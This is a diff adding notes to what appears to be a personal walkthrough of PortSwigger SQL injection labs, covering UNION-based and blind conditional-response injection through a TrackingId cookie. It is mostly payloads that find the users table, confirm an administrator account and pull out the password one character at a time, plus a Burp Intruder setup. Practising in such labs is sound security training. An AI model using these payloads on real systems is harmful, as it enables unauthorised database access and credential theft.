@@ -240,3 +240,38 @@ Steps:
 	4b. category=Gifts' UNION SELECT username,password FROM users--
 	4c. category=Lifestyle' UNION SELECT NULL,CONCAT(username, '~', password) FROM users--
 ```
+
+
+###### Lab: Blind SQL injection with conditional responses
+URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+Endpoint: TrackingId
+
+Steps:
+```
+1. Open Burp Suite
+2. Intercept the request and send it to repeater.
+3. TrackingId=3EBPs6MjysiXEHuK
+   Response: Welcome back will be returned.
+4. TrackingId=3EBPs6MjysiXEHuK'
+   Response: no welcome back message.
+5. TrackingId='+OR+1=1--;
+   Response: Welcome back will be returned.
+6. So we know that blind sql exists.
+7. TrackingId='+AND+1=1--;
+   Response: Welcome back will be returned.
+8. Check if table 'users' exists
+	8a. TrackingId='+AND+(SELECT+'1'+FROM+users+LIMIT+1)='1'--;
+		Response: Welcome back will be returned.
+9. Check if username 'administrator' exists.
+	9a. TrackingId='+AND+(SELECT+'1'+FROM+users+WHERE+username='administrator'+LIMIT+1)='1'--;
+10. Check if the password length is greater than 1.
+	10a. TrackingId='+AND+(SELECT+1+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='1'--;
+11. Check if the password length is 20.
+	11a. TrackingId='+AND+(SELECT+1+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='1'--;
+12. Check if the first character is c.
+	13a. TrackingId='+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='c'--;
+13. Send it to intruder and run it. so we get all the characters.
+	13a. Attack Type: Cluster bomb
+	13b. Payload set 1: 1-20
+	13c. Payload set 2: a-z and 0-9
+```
